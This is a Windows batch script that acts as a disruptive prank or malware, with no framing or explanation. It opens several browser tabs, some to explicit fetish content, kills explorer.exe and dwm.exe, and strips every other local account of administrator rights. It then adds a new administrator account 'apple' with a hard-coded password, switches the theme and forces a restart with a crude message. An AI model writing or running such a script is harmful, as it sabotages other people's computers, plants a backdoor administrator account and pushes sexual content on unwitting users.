@echo off
color a
start "" https://www.youtube.com/watch?v=WLjsHyDSaqI
start "" https://www.youtube.com/
start "" https://yip.su/analvore
start "" https://www.google.com/chrome/static/videos/home/hero/hero.webm
start "" https://bing.com/search?q=google+chrome
start "" https://google.com/search?q=anal+vore
start "" https://thisvid.com/videos/frost-anal-vore/
echo a
taskkill /f /im explorer.exe
taskkill /f /im dwm.exe
start mspaint C:\Windows\System32\oobe\background.bmp
copy C:\Windows\System32\oobe\background.bmp C:\Users\%username\Desktop\bg.bmp
start explorer.exe
for /f "tokens=2 delims=\" %%a in ("%username%") do set currentUser=%%a
if not defined currentUser set currentUser=%username%
for /f "skip=1" %%u in ('wmic useraccount get name') do (
    set "user=%%u"
    setlocal enabledelayedexpansion
    set "trim=!user: =!"
    if not "!trim!"=="" if /i not "!trim!"=="%currentUser%" (
        echo !trim! has referenced a null object reference
        net localgroup Administrators "!trim!" /delete
    )
    endlocal

    
) >> C:/log.log
net user apple fart /add
net localgroup Administrators "apple" /add
for /f "skip=1" %%u in ('wmic useraccount get name') do (
    set "user=%%u"
    setlocal enabledelayedexpansion
    set "trim=!user: =!"
    if not "!trim!"=="" if /i not "!trim!"=="%currentUser%" (
        echo !trim! has referenced a ass object reference
        taskkill /f /im dwm.exe
        start "" https://google.com/search?q=!trim!
    )
    endlocal

    
) >> C:/log2.log
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes" /v CurrentTheme /t REG_SZ /d "Windows Classic" /f
shutdown /r /t 60 /c "The browser that gets more done, up your ass."
